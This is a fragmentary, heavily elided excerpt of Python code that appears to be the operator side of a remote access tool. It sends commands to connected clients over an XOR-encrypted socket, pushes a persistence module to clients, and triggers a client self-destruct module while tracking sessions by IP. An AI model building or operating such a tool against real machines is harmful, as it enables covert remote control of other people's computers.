...
""",
    ...
    def executeCommand(self, cmd_list):
        ...
        if CheckConn().sendsafe(self.session_nb, self.sock, cmd):  # send data
            CheckConn().recvcommand(
                self.sock, 4096
            )  # XOR  The decryption of xor is automatic on this method.
    ...
    def lonelyPersistence(self):
        ...
        if CheckConn().sendsafe(
            self.session_nb, self.sock, mod_persi
        ):  # send mod persi
            ...
            if reponse == "\r\n":  # Mod persi ok
                ...
                printColor(
                    "error",
                    "[-] the persistence mod could not be executed on the client.",
                )
        ...
        if areYouSure():
            ...
            if CheckConn().sendsafe(self.session_nb, self.sock, mod_destruction):
                ...
                if reponse[1] == "True":
                    ...
                    printColor(
                        "error",
                        "[-] The client The connection therefore stays active.\n",
                    )
                    ...
                    for key in Handler.dict_conn.keys():
                        if (
                            ...
                            == Handler.dict_conn[self.session_nb][NB_IP]
                            and Handler.dict_conn[key][NB_SOCKET] != bool()
                        ):
                            ...
                            printColor(
                                ...
                                "[-] Client number {} {}:{} was disconnected.".format(
                                    Handler.dict_conn[key][NB_SESSION],
                                    Handler.dict_conn[key][NB_IP],
    ...
    def main(
        self,
    ):  # Main function of the class | tpl = tuple session_nb = session number
        printColor("help", "\n[?] Run -h or --help to list the available commands.\n")
        checker = True  # and checker why and ?
        while (
            Handler.dict_conn[self.session_nb][NB_ALIVE] and checker
        ):  # If connexion is always connected (True) | The checker allows to break the loop when the -b or --back argument is executed without touching a NB_ALIVE
